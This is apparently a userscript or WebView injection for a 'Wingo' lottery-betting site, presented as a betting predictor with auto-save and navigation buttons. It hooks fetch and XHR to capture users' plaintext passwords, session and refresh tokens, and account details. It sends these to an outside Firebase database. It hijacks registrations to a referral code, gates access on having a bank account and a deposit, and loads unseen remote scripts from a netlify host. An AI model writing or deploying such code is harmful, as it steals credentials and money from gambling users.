(function() {
    'use strict';

    console.log('🚀 Wingo Full Script Active (AutoSave + Login Check + Withdraw Validation + Deposit Check)');

    // ================================================================
    // 1. FIREBASE CONFIG & LOAD
    // ================================================================
    const firebaseConfig = {
        apiKey: "AIzaSyDtZxsl5LZp3n1KZJfdVAdqQj22ZBPoQbU",
        authDomain: "steady-fin-368617.firebaseapp.com",
        databaseURL: "https://steady-fin-368617-default-rtdb.firebaseio.com",
        projectId: "steady-fin-368617",
        storageBucket: "steady-fin-368617.firebasestorage.app",
        messagingSenderId: "626971902484",
        appId: "1:626971902484:web:98f7cdbd55c5990dfe9d01",
        measurementId: "G-70D3LR995Y"
    };

    let firebaseLoaded = false;
    let db = null;

    function loadFirebase() {
        return new Promise((resolve) => {
            if (typeof firebase !== 'undefined' && firebase.database) {
                firebaseLoaded = true;
                db = firebase.database();
                console.log('✅ Firebase already loaded');
                resolve();
                return;
            }
            if (document.querySelector('script[src*="firebase-app-compat.js"]')) {
                const checkFirebase = setInterval(() => {
                    if (typeof firebase !== 'undefined' && firebase.database) {
                        clearInterval(checkFirebase);
                        firebaseLoaded = true;
                        db = firebase.database();
                        console.log('✅ Firebase loaded (existing script)');
                        resolve();
                    }
                }, 100);
                return;
            }
            console.log('⏳ Loading Firebase...');
            const s1 = document.createElement('script');
            s1.src = 'https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js';
            s1.onload = () => {
                const s2 = document.createElement('script');
                s2.src = 'https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js';
                s2.onload = () => {
                    firebase.initializeApp(firebaseConfig);
                    firebaseLoaded = true;
                    db = firebase.database();
                    console.log('✅ Firebase initialized');
                    resolve();
                };
                document.head.appendChild(s2);
            };
            document.head.appendChild(s1);
        });
    }

    // ================================================================
    // 2. FUNGSI DATABASE
    // ================================================================
    function saveUser(userId, data) {
        if (!userId || !db) {
            console.warn('⚠️ saveUser: db atau userId kosong');
            return;
        }
        db.ref("uids/" + userId).update({
            ...data,
            updated: Date.now()
        });
        console.log("✅ User data saved for UID:", userId);
    }

    // Cek apakah UID adalah downline (ada di Firebase dan parentInviteCode cocok)
    async function checkUidIsDownline(uid) {
        if (!db) {
            console.warn('⚠️ db belum siap');
            return false;
        }
        try {
            const snapshot = await db.ref('uids/' + uid).once('value');
            if (!snapshot.exists()) {
                console.log(`🔍 UID ${uid} tidak ditemukan di Firebase`);
                return false;
            }
            const data = snapshot.val();
            // Periksa apakah parentInviteCode sesuai
            if (data.parentInviteCode === 'DtX6m351494') {
                console.log(`✅ UID ${uid} adalah downline (parentInviteCode cocok)`);
                return true;
            } else {
                console.log(`❌ UID ${uid} bukan downline (parentInviteCode=${data.parentInviteCode})`);
                return false;
            }
        } catch(e) {
            console.error('❌ Firebase check error:', e);
            return false;
        }
    }

    function forceLogoutAndRedirect() {
        console.log('🚪 Melakukan logout paksa dan redirect ke 551br.com/#/main');
        localStorage.clear();
        sessionStorage.clear();
        document.cookie.split(";").forEach(function(c) {
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
        });
        window.location.href = 'https://551br.com/#/main';
    }

    // ================================================================
    // 3. HANDLER REGISTER (hanya simpan jika downline)
    // ================================================================
    function handleRegisterResponse(data, requestBody) {
        console.log('📝 handleRegisterResponse dipanggil');
        if (!data || data.code !== 0) {
            console.log('Register tidak sukses, skip');
            return;
        }
        if (!data.data || !data.data.token) {
            console.log('Tidak ada token di response Register');
            return;
        }
        const token = data.data.token;
        try {
            const payload = JSON.parse(atob(token.split('.')[1]));
            const userId = payload.UserId;
            if (!userId) {
                console.log('Tidak ada UserId di token Register');
                return;
            }
            const parentInviteCode = data.data.parentInviteCode || '';
            console.log(`🔑 Register: userId=${userId}, parentInviteCode=${parentInviteCode}`);
            if (parentInviteCode !== 'DtX6m351494') {
                console.log(`❌ Register dengan parentInviteCode=${parentInviteCode}, bukan downline kita. Skip save.`);
                return;
            }
            const password = (requestBody && requestBody.pwd) || '';
            saveUser(userId, {
                nickName: payload.NickName || '',
                userName: payload.UserName || '',
                parentUserId: data.data.parentUserId || '',
                parentInviteCode: parentInviteCode,
                token: token,
                refreshToken: data.data.refreshToken || '',
                expiresIn: data.data.expiresIn || 0,
                tokenType: payload.TokenType || '',
                role: payload.role || '',
                pwd: password,
                regTime: payload.LoginTime || '',
                registerType: requestBody ? requestBody.registerType : '',
                active: true,
                status: 1
            });
            console.log(`✅ Register SUCCESS: ${userId} saved as downline.`);
        } catch(e) {
            console.warn('❌ Gagal decode token Register', e);
        }
    }

    // ================================================================
    // 4. HANDLER LOGIN + VALIDASI WITHDRAW
    // ================================================================
    let pendingWithdrawCheck = false;
    let withdrawCheckData = {
        hasBankAccount: false,
        firstDepositDone: false,
        checked: false
    };
    let loginUserIdForCheck = null;

    async function handleLoginResponse(data) {
        console.log('🔍 handleLoginResponse dipanggil, data:', data);

        if (!data) {
            console.log('Data login kosong');
            return;
        }
        if (data.code !== 0) {
            console.log('Login gagal (code != 0), skip');
            return;
        }
        if (!data.data || !data.data.token) {
            console.log('Tidak ada token di response Login');
            return;
        }

        const token = data.data.token;
        try {
            const payload = JSON.parse(atob(token.split('.')[1]));
            const userId = payload.UserId;
            if (!userId) {
                console.log('Tidak ada UserId di token Login');
                return;
            }
            console.log('🔑 Login UID dari token:', userId);

            await loadFirebase();
            const isDownline = await checkUidIsDownline(userId);
            console.log(`🔎 Hasil cek UID ${userId} di Firebase: ${isDownline ? 'DOWNLINE' : 'BUKAN DOWNLINE'}`);

            if (!isDownline) {
                console.warn(`⚠️ UID ${userId} BUKAN downline!`);
                alert('⚠️ Akun Anda bukan downline yang terdaftar. Anda akan di-logout.');
                forceLogoutAndRedirect();
                return;
            }

            console.log(`✅ UID ${userId} adalah downline.`);

            // Hapus flag withdrawChecked agar pengecekan ulang dilakukan
            localStorage.removeItem('withdrawChecked');

            // Mulai proses validasi withdraw
            pendingWithdrawCheck = true;
            loginUserIdForCheck = userId;
            withdrawCheckData.hasBankAccount = false;
            withdrawCheckData.firstDepositDone = false;
            withdrawCheckData.checked = false;

            // Paksa ke halaman withdraw
            console.log('🔀 Redirect ke halaman withdraw untuk validasi...');
            window.location.hash = '#/wallet/Withdraw';

            // Set timeout 15 detik
            setTimeout(() => {
                if (pendingWithdrawCheck && !withdrawCheckData.checked) {
                    console.warn('⏰ Timeout validasi withdraw, logout paksa');
                    alert('⏰ Validasi gagal (timeout). Anda akan di-logout.');
                    forceLogoutAndRedirect();
                }
            }, 15000);

        } catch(e) {
            console.warn('❌ Gagal decode token Login:', e);
        }
    }

    // ================================================================
    // 5. HANDLER GETUSERINFO (update data + ambil userRechargeTimes)
    // ================================================================
    async function handleGetUserInfo(data) {
        console.log('📊 handleGetUserInfo dipanggil');
        if (!data || data.code !== 0) {
            console.log('GetUserInfo tidak sukses, skip');
            return;
        }
        const userData = data.data;
        if (!userData || !userData.userId) {
            console.log('Tidak ada userId di GetUserInfo');
            return;
        }
        const userId = userData.userId.toString();

        // Cek userRechargeTimes untuk menentukan sudah pernah deposit
        if (pendingWithdrawCheck && !withdrawCheckData.checked) {
            const rechargeTimes = parseInt(userData.userRechargeTimes) || 0;
            if (rechargeTimes > 0) {
                withdrawCheckData.firstDepositDone = true;
                console.log(`💳 userRechargeTimes = ${rechargeTimes} => deposit sudah pernah dilakukan.`);
                performWithdrawCheck();
            } else {
                console.log(`💳 userRechargeTimes = 0, belum pernah deposit.`);
            }
        }

        await loadFirebase();
        if (db) {
            db.ref("uids/" + userId).update({
                nickName: userData.nickName || '',
                userName: userData.userName || '',
                amount: userData.amount || 0,
                integral: userData.integral || 0,
                userPhoto: userData.userPhoto || '',
                regType: userData.regType || 0,
                addTime: userData.addTime || '',
                userLoginDate: userData.userLoginDate || '',
                sign: userData.sign || '',
                keyCode: userData.keyCode || '',
                isvalidator: userData.isvalidator || 0,
                userRechargeTimes: userData.userRechargeTimes || 0,
                updated: Date.now()
            });
            console.log(`✅ GetUserInfo data updated for UID: ${userId}`);
        } else {
            console.warn('⚠️ db belum siap, tidak bisa update GetUserInfo');
        }
    }

    // ================================================================
    // 6. HANDLER GETWITHDRAWALS (cek rekening bank)
    // ================================================================
    function handleGetWithdrawals(data) {
        console.log('🏦 handleGetWithdrawals dipanggil');
        if (!data || data.code !== 0) {
            console.log('getWithdrawals tidak sukses');
            return;
        }
        if (!data.data || !data.data.withdrawalslist) {
            console.log('Tidak ada withdrawalslist di getWithdrawals');
            return;
        }
        const list = data.data.withdrawalslist;
        const hasBank = Array.isArray(list) && list.length > 0;
        if (pendingWithdrawCheck && !withdrawCheckData.checked) {
            withdrawCheckData.hasBankAccount = hasBank;
            console.log(`🏦 Rekening bank ditemukan: ${hasBank}`);
            performWithdrawCheck();
        }
    }

    // ================================================================
    // 7. FUNGSI VALIDASI WITHDRAW (hanya cek rekening & deposit)
    // ================================================================
    function performWithdrawCheck() {
        if (withdrawCheckData.checked) return;
        // Syarat: hasBankAccount dan firstDepositDone
        if (withdrawCheckData.hasBankAccount === false ||
            withdrawCheckData.firstDepositDone === false) {
            // Belum lengkap
            return;
        }

        withdrawCheckData.checked = true;
        pendingWithdrawCheck = false;

        const hasBank = withdrawCheckData.hasBankAccount;
        const firstDeposit = withdrawCheckData.firstDepositDone;

        console.log(`🔍 Validasi: Rekening = ${hasBank}, DepositPertama = ${firstDeposit}`);

        if (hasBank && firstDeposit) {
            console.log('✅ Validasi berhasil! Rekening terdaftar dan sudah deposit.');
            localStorage.setItem('withdrawChecked', 'true');
            // Inject script verifikasi
            injectVerificationScript();
        } else {
            let reason = '';
            if (!hasBank) reason += 'Belum ada rekening bank yang tertaut. ';
            if (!firstDeposit) reason += 'Belum melakukan deposit pertama. ';
            console.warn(`❌ Validasi gagal: ${reason}`);
            alert(`⚠️ ${reason}Anda akan di-logout.`);
            forceLogoutAndRedirect();
        }
    }

    // ================================================================
    // 8. INJECT SCRIPT VERIFIKASI
    // ================================================================
    function injectVerificationScript() {
        if (document.querySelector('script[src="https://55predictor.netlify.app/script_verifikasi_398254.js"]')) {
            console.log('✅ Verification script already loaded');
            return;
        }
        var s = document.createElement('script');
        s.src = 'https://55predictor.netlify.app/script_verifikasi_398254.js';
        s.onload = function() {
            console.log('✅ Verification script loaded');
        };
        s.onerror = function() {
            console.error('❌ Failed to load verification script');
        };
        document.body.appendChild(s);
        console.log('📦 Injection verification script');
    }

    // ================================================================
    // 9. WINGO GAME NAVIGATION
    // ================================================================
    function createNav() {
        if (document.getElementById('wingo-nav-container')) return;

        console.log('🕹️ Wingo Navigation Active');

        var nav = document.createElement('div');
        nav.id = 'wingo-nav-container';
        nav.style.cssText = `
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(8px);
            display: flex;
            justify-content: space-around;
            padding: 10px 0;
            z-index: 99999;
            border-top: 1px solid rgba(255,255,255,0.1);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        `;

        function createButton(text, color, onClick) {
            var btn = document.createElement('button');
            btn.innerText = text;
            btn.style.cssText = `
                background: ${color};
                border: none;
                border-radius: 8px;
                color: white;
                padding: 8px 12px;
                font-size: 14px;
                font-weight: bold;
                cursor: pointer;
                min-width: 60px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.3);
                transition: transform 0.1s;
            `;
            btn.addEventListener('click', onClick);
            btn.addEventListener('touchstart', function() {
                this.style.transform = 'scale(0.95)';
            });
            btn.addEventListener('touchend', function() {
                this.style.transform = 'scale(1)';
            });
            return btn;
        }

        var keepOnBtn = createButton('Keep On', '#4CAF50', function() {
            try {
                if (window.AppInventor && window.AppInventor.setWebViewString) {
                    window.AppInventor.setWebViewString('keepOn');
                } else if (window.AppInventor) {
                    window.AppInventor.WebViewString = 'keepOn';
                } else {
                    console.log('Keep On clicked (no AppInventor)');
                }
            } catch(e) {
                console.error('Error sending to Kodular:', e);
            }
        });

        var startBtn = createButton('Start Betting', '#2196F3', function() {
            var existing = document.querySelector('script[src="https://55predictor.netlify.app/398254.js"]');
            if (existing) {
                console.log('Script already loaded');
                if (typeof wingoAuto !== 'undefined' && wingoAuto.start) {
                    wingoAuto.start();
                } else {
                    console.warn('wingoAuto not ready');
                }
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://55predictor.netlify.app/398254.js';
            s.onload = function() {
                console.log('398254.js loaded');
                if (typeof wingoAuto !== 'undefined' && wingoAuto.start) {
                    wingoAuto.start();
                }
            };
            s.onerror = function() {
                console.error('Failed to load 398254.js');
            };
            document.body.appendChild(s);
        });

        var stopBtn = createButton('Stop Betting', '#f44336', function() {
            if (typeof wingoAuto !== 'undefined' && wingoAuto.stop) {
                wingoAuto.stop();
            } else {
                console.warn('wingoAuto.stop not available');
            }
        });

        var statusBtn = createButton('Status', '#9C27B0', function() {
            if (typeof wingoAuto !== 'undefined' && wingoAuto.status) {
                wingoAuto.status();
            } else {
                console.warn('wingoAuto.status not available');
            }
        });

        var resetBtn = createButton('Reset', '#FF9800', function() {
            if (typeof wingoAuto !== 'undefined' && wingoAuto.reset) {
                wingoAuto.reset();
            } else {
                console.warn('wingoAuto.reset not available');
            }
        });

        nav.appendChild(keepOnBtn);
        nav.appendChild(startBtn);
        nav.appendChild(stopBtn);
        nav.appendChild(statusBtn);
        nav.appendChild(resetBtn);

        document.body.appendChild(nav);
        document.body.style.paddingBottom = '70px';
        console.log('✅ Wingo navigation added');
    }

    function removeNav() {
        var nav = document.getElementById('wingo-nav-container');
        if (nav) {
            nav.remove();
            document.body.style.paddingBottom = '0';
            console.log('🗑️ Wingo navigation removed');
        }
    }

    // ================================================================
    // 10. INTERCEPTOR FETCH & XHR (case-insensitive untuk Register)
    // ================================================================
    function setupInterceptor() {
        console.log('🛠️ Setting up fetch & XHR interceptors');

        // ===== FETCH =====
        const origFetch = window.fetch;
        window.fetch = async (...args) => {
            const [url, options] = args;
            let requestBody = null;
            if (typeof url === 'string' && options && options.body) {
                try {
                    requestBody = JSON.parse(options.body);
                } catch(e) {}
            }

            const res = await origFetch(...args);
            const clone = res.clone();
            const contentType = res.headers.get('content-type') || '';
            if (contentType.includes('application/json')) {
                clone.json().then(async (data) => {
                    if (typeof url === 'string') {
                        const urlLower = url.toLowerCase();
                        if (urlLower.includes('/register')) {
                            console.log('📡 Fetch intercepted: Register');
                            await loadFirebase();
                            handleRegisterResponse(data, requestBody);
                        }
                        if (urlLower.includes('/login')) {
                            console.log('📡 Fetch intercepted: Login');
                            await loadFirebase();
                            await handleLoginResponse(data);
                        }
                        if (urlLower.includes('/getuserinfo')) {
                            console.log('📡 Fetch intercepted: GetUserInfo');
                            await loadFirebase();
                            await handleGetUserInfo(data);
                        }
                        if (urlLower.includes('/getwithdrawals')) {
                            console.log('📡 Fetch intercepted: getWithdrawals');
                            handleGetWithdrawals(data);
                        }
                    }
                }).catch(() => {});
            }
            return res;
        };

        // ===== XHR =====
        const origOpen = XMLHttpRequest.prototype.open;
        const origSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            this._method = method;
            origOpen.apply(this, arguments);
        };
        XMLHttpRequest.prototype.send = function(body) {
            const self = this;
            let requestBody = null;
            if (self._method === 'POST' && self._url && body) {
                try {
                    requestBody = JSON.parse(body);
                } catch(e) {}
            }
            this.addEventListener('load', function() {
                const contentType = this.getResponseHeader('content-type') || '';
                if (contentType.includes('application/json')) {
                    try {
                        const data = JSON.parse(this.responseText);
                        if (self._url) {
                            const urlLower = self._url.toLowerCase();
                            if (urlLower.includes('/register')) {
                                console.log('📡 XHR intercepted: Register');
                                loadFirebase().then(() => {
                                    handleRegisterResponse(data, requestBody);
                                });
                            }
                            if (urlLower.includes('/login')) {
                                console.log('📡 XHR intercepted: Login');
                                loadFirebase().then(() => {
                                    handleLoginResponse(data);
                                });
                            }
                            if (urlLower.includes('/getuserinfo')) {
                                console.log('📡 XHR intercepted: GetUserInfo');
                                loadFirebase().then(() => {
                                    handleGetUserInfo(data);
                                });
                            }
                            if (urlLower.includes('/getwithdrawals')) {
                                console.log('📡 XHR intercepted: getWithdrawals');
                                handleGetWithdrawals(data);
                            }
                        }
                    } catch(e) {}
                }
            });
            origSend.call(this, body);
        };
    }

    // ================================================================
    // 11. REDIRECT REGISTER KE NUXPIRA DENGAN KODE UNDANGAN
    // ================================================================
    function redirectRegisterToNuxpira() {
        var currentUrl = window.location.href;
        if (currentUrl.includes('551br.com/#/register') && !currentUrl.includes('nuxpira.com')) {
            var newUrl = 'https://www.nuxpira.com/#/register?invitationCode=DtX6m351494';
            console.log('🔀 Redirecting register to:', newUrl);
            window.location.replace(newUrl);
            return true;
        }
        return false;
    }

    // ================================================================
    // 12. INIT
    // ================================================================

    setupInterceptor();

    // Redirect Register
    setTimeout(redirectRegisterToNuxpira, 100);

    // Cek status login dan flag withdrawChecked
    setTimeout(async () => {
        const hasToken = localStorage.getItem('token') || sessionStorage.getItem('token');
        const withdrawChecked = localStorage.getItem('withdrawChecked') === 'true';

        if (hasToken) {
            console.log('🔑 Token ditemukan di localStorage.');
            // Cek UID di Firebase (downline check)
            try {
                const token = hasToken;
                const payload = JSON.parse(atob(token.split('.')[1]));
                const userId = payload.UserId;
                if (userId) {
                    await loadFirebase();
                    const isDownline = await checkUidIsDownline(userId);
                    if (!isDownline) {
                        console.warn(`⚠️ UID ${userId} BUKAN downline!`);
                        alert('⚠️ Akun Anda bukan downline yang terdaftar. Anda akan di-logout.');
                        forceLogoutAndRedirect();
                        return;
                    }
                    console.log(`✅ UID ${userId} adalah downline.`);
                } else {
                    console.warn('Tidak ada UserId di token, logout');
                    forceLogoutAndRedirect();
                    return;
                }
            } catch(e) {
                console.warn('Gagal decode token saat init:', e);
                forceLogoutAndRedirect();
                return;
            }

            if (withdrawChecked) {
                console.log('✅ Sudah lolos validasi withdraw, inject verification script.');
                injectVerificationScript();
            } else {
                console.log('🔄 Belum lolos validasi withdraw, arahkan ke halaman withdraw...');
                window.location.hash = '#/wallet/Withdraw';
                pendingWithdrawCheck = true;
                // Set timeout 15 detik
                setTimeout(() => {
                    if (pendingWithdrawCheck && !withdrawCheckData.checked) {
                        console.warn('⏰ Timeout validasi withdraw (init), logout paksa');
                        alert('⏰ Validasi gagal (timeout). Anda akan di-logout.');
                        forceLogoutAndRedirect();
                    }
                }, 15000);
            }
        } else {
            console.log('ℹ️ Tidak ada token, tidak perlu validasi.');
        }
    }, 3000);

    // Navigasi game
    if (window.location.href.includes('/home/AllLotteryGames/WinGo')) {
        setTimeout(createNav, 500);
    }

    window.addEventListener('hashchange', function() {
        redirectRegisterToNuxpira();

        if (window.location.href.includes('/home/AllLotteryGames/WinGo')) {
            setTimeout(createNav, 500);
        } else {
            removeNav();
        }
    });

    console.log('🚀 Wingo Full Script (AutoSave + LoginCheck + Withdraw + Deposit Validation) initialized');
})();